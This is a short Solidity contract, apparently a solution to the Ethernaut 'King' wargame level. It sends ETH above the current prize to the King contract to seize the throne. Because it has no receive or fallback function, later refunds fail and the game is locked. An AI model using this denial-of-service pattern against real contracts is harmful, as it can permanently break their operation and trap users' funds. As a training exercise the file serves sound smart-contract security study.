// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/King.sol";

contract HackKing {
    King private immutable _king;

    constructor(address payable kingAddress) {
        _king = King(kingAddress);
    }

    function becomeKing() external payable {
        require(msg.value > _king.prize(), "Not enough ETH sent");
        //Send eth to the king contract
        (bool success, ) = payable(_king).call{value: msg.value}("");
        require(success, "Transfer failed.");
    }
}